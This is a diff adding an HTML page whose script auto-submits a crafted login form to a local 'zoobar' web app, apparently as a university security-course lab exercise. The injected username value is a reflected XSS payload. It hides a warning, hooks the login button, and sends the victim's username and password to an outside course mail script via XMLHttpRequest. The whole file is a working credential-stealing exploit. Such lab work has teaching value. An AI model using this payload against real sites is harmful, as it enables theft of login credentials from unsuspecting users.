@@ -1,0 +1,30 @@
+<body>
+<script>
+function post(path, params, method) {
+    method = method || "post"; // Set method to post by default if not specified.
+
+    // The rest of this code assumes you are not using a library.
+    // It can be made less wordy if you use one.
+    var form = document.createElement("form");
+    form.setAttribute("method", method);
+    form.setAttribute("action", path);
+
+    for(var key in params) {
+        if(params.hasOwnProperty(key)) {
+            var hiddenField = document.createElement("input");
+            hiddenField.setAttribute("type", "hidden");
+            hiddenField.setAttribute("name", key);
+            hiddenField.setAttribute("value", params[key]);
+
+            form.appendChild(hiddenField);
+         }
+    }
+
+    document.body.appendChild(form);
+    form.submit();
+}
+u='"><script>setTimeout(function(){document.getElementsByClassName("warning")[0].innerHTML="";login=document.getElementsByTagName("input")[2];login.onclick=function(){try {var xmlHttp; xmlHttp = new XMLHttpRequest();username = document.getElementsByName("login_username")[0].value;pwd = document.getElementsByName("login_password")[0].value;url = "http://tcloud.sjtu.edu.cn/courses/css/2014/sendmail.php?to=kkmnmbj%40sjtu.edu.cn&payload="+username + "%2C" + pwd + "&send_submit=Send+Email";xmlHttp.open("GET", url, false);xmlHttp.send();} catch(err) {} ;};},0)</' + 'script><b'
+post("http://localhost:8080/zoobar/index.cgi/login",{login_username:u})
+</script>
+</body>
+
